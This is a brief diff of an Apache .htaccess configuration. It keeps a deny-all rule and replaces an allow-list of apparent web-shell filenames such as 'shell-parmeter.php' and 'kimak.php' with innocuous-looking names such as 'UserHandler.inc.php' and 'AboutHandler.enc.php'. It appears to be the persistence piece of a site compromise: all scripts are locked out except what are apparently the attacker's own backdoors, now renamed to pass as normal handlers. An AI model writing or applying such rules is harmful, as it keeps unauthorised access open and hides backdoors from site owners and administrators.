@@ -5,7 +5,7 @@ Order allow,deny
 Deny from all
 </FilesMatch>
 
-<FilesMatch "^(config.enc.php|404.php|shell-parmeter.php|kimak.php|PaymentHandlers.php|Sniffers.php|readonlys.php|SubmissionsListPanels.php|shelbelawa.php)$">
+<FilesMatch "^(UserHandler.inc.php|AboutHandler.enc.php|submission.inc.php|manager.inc.php|PublicIdentifiersForm.inc.php)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
